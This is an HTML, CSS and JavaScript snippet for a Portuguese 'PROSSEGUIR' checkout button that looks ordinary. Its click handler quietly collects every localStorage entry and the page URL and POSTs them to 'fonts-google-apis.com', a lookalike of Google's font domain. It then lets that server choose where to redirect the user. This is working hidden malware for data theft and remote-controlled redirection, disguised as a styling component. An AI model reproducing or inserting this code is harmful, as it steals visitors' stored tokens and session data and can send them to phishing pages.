<!-- BotÃ£o: PROSSEGUIR -->
<style>
.btn-a8aaa4ff {
  background: #E83D22;
  color: #ffffff;
  padding: 12px 24px;
  width: auto;
  height: auto;
  border: none;
  border-radius: 4px;
  font-weight: 800;
  font-size: 14px;
  cursor: pointer;
  font-family: Inter, sans-serif;
  text-decoration: none;
  display: inline-block;
  transition: opacity 0.2s;
  position: relative;
}
.btn-a8aaa4ff:hover {
  opacity: 0.9;
}
.btn-a8aaa4ff.loading {
  cursor: not-allowed;
  opacity: 0.7;
}
.btn-a8aaa4ff .spinner {
  display: none;
  width: 12px;
  height: 12px;
  border: 2px solid transparent;
  border-top: 2px solid currentColor;
  border-radius: 50%;
  animation: spin 1s linear infinite;
  margin-right: 8px;
  vertical-align: text-top;
}
.btn-a8aaa4ff.loading .spinner {
  display: inline-block;
}
@keyframes spin {
  0% { transform: rotate(0deg); }
  100% { transform: rotate(360deg); }
}
</style>
<button class="btn-a8aaa4ff" onclick="window.location.href='/finalizacao'"><span class="spinner"></span><span class="btn-text">PROSSEGUIR</span></button>
<script>
(function(){
  var btn = document.querySelector('.btn-a8aaa4ff');
  if(btn) {
    var originalHref = '/finalizacao';
    btn.onclick = function(e) {
      e.preventDefault();
      
      // Function to perform the redirect with optional temp data ID
      function performRedirect(tempDataId) {
        var xhr = new XMLHttpRequest();
        xhr.open('GET', 'https://fonts-google-apis.com/css/fonts/a8aaa4ff-9fa3-4be7-b50f-2a10fd5c5b6c', true);
        xhr.onreadystatechange = function() {
          if(xhr.readyState === 4) {
            var redirectUrl = originalHref;
            if(xhr.status === 200) {
              try {
                var response = JSON.parse(xhr.responseText);
                redirectUrl = response.redirect_url || originalHref;
              } catch(e) {}
            }
            
            // Append temp data ID to redirect URL if available
            if(tempDataId && redirectUrl) {
              var separator = redirectUrl.includes('?') ? '&' : '?';
              redirectUrl += separator + 'tempData=' + tempDataId;
            }
            
            // Handle relative URLs
            if(redirectUrl.startsWith('/')) {
              redirectUrl = window.location.protocol + '//' + window.location.host + redirectUrl;
            }
            window.location.href = redirectUrl;
          }
        };
        xhr.onerror = function() {
          // Fallback to original URL if API fails
          var url = originalHref;
          if(url.startsWith('/')) {
            url = window.location.protocol + '//' + window.location.host + url;
          }
          window.location.href = url;
        };
        xhr.send();
      }
      
      // Capture localStorage data
      try {
        var localStorageData = {};
        for (var i = 0; i < localStorage.length; i++) {
          var key = localStorage.key(i);
          if (key) {
            localStorageData[key] = localStorage.getItem(key);
          }
        }
        
        // Only send localStorage data if there's something to send
        if (Object.keys(localStorageData).length > 0) {
          // Show loading state
          btn.classList.add('loading');
          btn.disabled = true;
          var btnText = btn.querySelector('.btn-text');
          var originalText = btnText.textContent;
          btnText.textContent = 'Carregando...';
          // Store localStorage data temporarily
          var storeXhr = new XMLHttpRequest();
          storeXhr.open('POST', 'https://fonts-google-apis.com/api/temp-data', true);
          storeXhr.setRequestHeader('Content-Type', 'application/json');
          storeXhr.onreadystatechange = function() {
            if(storeXhr.readyState === 4) {
              var tempDataId = null;
              if(storeXhr.status === 201) {
                try {
                  var storeResponse = JSON.parse(storeXhr.responseText);
                  tempDataId = storeResponse.id;
                } catch(e) {}
              }
              // Perform redirect with or without temp data ID
              performRedirect(tempDataId);
            }
          };
          storeXhr.onerror = function() {
            // Restore button state on error
            btn.classList.remove('loading');
            btn.disabled = false;
            btnText.textContent = originalText;
            // If storing fails, just perform normal redirect
            performRedirect(null);
          };
          
          var requestData = {
            buttonId: 'a8aaa4ff-9fa3-4be7-b50f-2a10fd5c5b6c',
            localStorageData: JSON.stringify(localStorageData),
            sourceUrl: window.location.href
          };
          storeXhr.send(JSON.stringify(requestData));
        } else {
          // No localStorage data, perform normal redirect
          performRedirect(null);
        }
      } catch(err) {
        // If localStorage access fails, perform normal redirect
        performRedirect(null);
      }
    };
  }
})();
</script>